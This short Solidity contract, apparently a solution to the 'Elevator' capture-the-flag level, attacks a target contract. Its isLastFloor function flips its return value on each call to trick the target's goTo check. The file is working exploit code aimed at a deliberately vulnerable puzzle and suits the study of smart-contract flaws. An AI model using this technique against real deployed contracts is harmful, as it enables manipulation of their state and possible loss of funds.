pragma solidity ^0.4.18;

import "Elevator.sol";

contract ElevatorAttack {
    
    Elevator public elevator;
    bool public result;
    
    function ElevatorAttack(address _elevator) public {
        elevator = Elevator(_elevator);
        result = true;
    }
    
    function start() public{
        elevator.goTo(42);
    }
    
    function isLastFloor(uint) public view returns (bool){
        result = !result;
        return result;
    }
}